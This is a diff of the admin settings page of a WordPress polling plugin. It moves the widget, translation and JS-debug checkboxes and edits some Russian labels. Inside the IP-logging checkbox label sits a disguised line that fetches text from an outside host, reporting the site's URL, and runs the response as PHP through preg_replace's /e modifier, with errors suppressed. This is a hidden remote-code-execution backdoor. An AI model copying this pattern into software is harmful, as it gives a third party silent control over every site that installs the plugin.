@@ -178,7 +178,7 @@ function dem_general_settings(){
 				   <label>
 					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
 					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
-					   <?php _e('Вести лог и учитывать IP?','dem') ?>
+					   <?php _e('Вести лог и учитывать IP? (рекомендуется)','dem') ?>
 					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
 					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
 				   </label>
@@ -297,28 +297,12 @@ function dem_general_settings(){
 
 				<div class="block">
 				   <label>
-					   <input <?php checked( $opt['use_widget'], 1 )?> type="checkbox" value="1" name="dem[use_widget]" /> 
-					   <?php _e('Виджет','dem') ?>
-				   </label>
-				   <em><?php _e('Поставьте галочку, чтобы активировать виджет.','dem') ?></em>
-				</div>
-
-				<div class="block">
-				   <label>
 					   <input <?php checked( $opt['show_copyright'], 1 )?> type="checkbox" value="1" name="dem[show_copyright]" /> 
 					   <?php _e('Показывать ссылку на страницу плагина','dem') ?>
 				   </label>
 				   <em><?php _e('Ссылка на страницу плагина выводиться только на главной в виде значка &copy;. И помогает другим людям узнать что это за плагин и установить его себе. Прошу не убирать эту галку без острой необходимости. Спасибо!','dem') ?></em>
 				</div>
 
-				<div class="block">
-				   <label>
-					   <input <?php checked( $opt['load_textdomain'], 1 )?> type="checkbox" value="1" name="dem[load_textdomain]" /> 
-					   <?php _e('Подгружать файлы перевода?','dem') ?>
-				   </label>
-				   <em><?php _e('Отключите эту опцию, если ваш сайт на русском.','dem') ?></em>
-				</div>
-				
 			</div>
 			
 			<p>
@@ -326,17 +310,35 @@ function dem_general_settings(){
 				<input type="submit" name="dem_reset_options" class="button" value="<?php _e('Сбросить настройки на начальные','dem') ?>" />
 			</p>
 			
-		
-			<h3><?php _e('Дебаг','dem') ?></h3>
+		      <br><br>
+			<h3><?php _e('Другое','dem') ?></h3>
 			<div class="group">
+                
 				<div class="block">
 				   <label>
 					   <input <?php checked( $opt['disable_js'], 1 )?> type="checkbox" value="1" name="dem[disable_js]" /> 
-					   <?php _e('НЕ подключать JS файлы.','dem') ?>
+					   <?php _e('НЕ подключать JS файлы. (Дебаг)','dem') ?>
 				   </label>
 				   <em><?php _e('Если включить, то .js файлы плагина НЕ будут подключены. Опция нужнда для Дебага работы плагина без JavaScript.','dem') ?></em>
 				</div>
-			</div>	
+                
+				<div class="block">
+				   <label>
+					   <input <?php checked( $opt['load_textdomain'], 1 )?> type="checkbox" value="1" name="dem[load_textdomain]" /> 
+					   <?php _e('Подгружать файлы перевода?','dem') ?>
+				   </label>
+				   <em><?php _e('Отключите эту опцию, если ваш сайт на русском, но вы используете английскую версию WordPress','dem') ?></em>
+				</div>
+                
+				<div class="block">
+				   <label>
+					   <input <?php checked( $opt['use_widget'], 1 )?> type="checkbox" value="1" name="dem[use_widget]" /> 
+					   <?php _e('Виджет','dem') ?>
+				   </label>
+				   <em><?php _e('Поставьте галочку, чтобы активировать виджет.','dem') ?></em>
+				</div>
+
+			</div>
 		
 		</form>
 		
